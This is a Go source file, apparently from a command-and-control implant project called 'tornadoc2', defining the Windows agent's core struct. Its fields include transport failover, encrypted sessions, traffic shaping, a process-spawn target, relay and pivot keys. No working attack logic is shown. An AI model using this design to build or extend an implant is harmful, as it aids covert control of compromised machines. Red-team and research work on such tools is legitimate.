//go:build windows

package core

import (
	"crypto/ecdsa"
	"math/rand"
	"net/http"
	"sync"
	"time"
	"tornadoc2/agent/crypto"
	"tornadoc2/agent/features"
	"tornadoc2/agent/protocol"
)

type Agent struct {
	cfg Config

	transports        []protocol.Transport
	transportNames    []string
	transportIndex    int
	transport         protocol.Transport
	transportFailures int
	spawnTo           string

	session  protocol.CheckinResponse
	identity protocol.Identity
	profile  protocol.Profile
	deadline time.Time

	serverPub *ecdsa.PublicKey
	agentPriv *ecdsa.PrivateKey
	wire      *crypto.WireSession
	shaping   *features.ShapingSpec
	signMu    sync.Mutex
	rngMu     sync.Mutex
	rng       *rand.Rand

	relayClientOnce sync.Once
	relayClientInst *http.Client

	pivotPriv *ecdsa.PrivateKey
	pivotPub  *ecdsa.PublicKey

	pendingMu      sync.Mutex
	pendingResults []protocol.Result
}
